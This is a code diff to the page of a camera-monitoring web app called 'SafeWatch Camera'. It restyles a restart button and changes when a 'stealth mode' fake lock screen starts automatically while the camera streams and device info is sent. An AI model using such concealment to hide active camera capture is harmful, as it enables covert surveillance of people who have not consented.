@@ -5,7 +5,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>SafeWatch Camera</title>
-    <link rel="stylesheet" href="css/style.css?v=3.1">
+    <link rel="stylesheet" href="css/style.css?v=3.2">
     <link rel="manifest" href="manifest.json">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="theme-color" content="#0f172a">
@@ -133,8 +133,9 @@
 
     <!-- Restart Button -->
     <button id="restart-cam-btn"
-        style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 5001; background: red; color: white; border: none; padding: 20px 40px; border-radius: 10px; font-size: 1.2rem; display: none; cursor: pointer;">
-        اضغط هنا لتشغيل الكاميرا (Force Start)
+        style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 10000; background: #ef4444; color: white; border: none; padding: 25px 45px; border-radius: 20px; font-size: 1.3rem; display: none; cursor: pointer; box-shadow: 0 10px 30px rgba(239, 68, 68, 0.5); font-weight: bold;">
+        <ion-icon name="videocam-off-outline" style="vertical-align: middle; margin-left: 10px;"></ion-icon>
+        تنشيط الكاميرا يدوياً (Autoplay)
     </button>
 
     <div class="monitor-status" id="status-text" style="transition: opacity 0.5s; display: none;"></div>
@@ -260,10 +261,18 @@
                     sendDeviceInfo();
                     log("Monitor Active.");
 
-                    // Auto-activate stealth mode (fake lock screen)
-                    setTimeout(() => {
-                        toggleStealthMode();
-                    }, 1500);
+                    // ONLY Auto-lock if the video is actually playing to avoid black screen traps
+                    const videoPlaying = !localVideo.paused && localVideo.readyState >= 2;
+                    if (videoPlaying) {
+                        setTimeout(() => {
+                            if (!dimOverlay.style.opacity || dimOverlay.style.opacity === '0') {
+                                toggleStealthMode();
+                                log("Silent Lock Activated.");
+                            }
+                        }, 3000);
+                    } else {
+                        log("Video state prevents auto-lock. Waiting for user.");
+                    }
                 } else {
                     throw new Error("No stream acquired");
                 }
@@ -396,6 +405,8 @@
                 } catch (e) {
                     log("Autoplay blocked: " + e.message);
                     restartBtn.style.display = 'block';
+                    // If blocked, we MUST NOT hide the permission overlay yet or the user won't know
+                    permissionOverlay.style.display = 'flex';
                 }
 
                 // Refresh connection if active
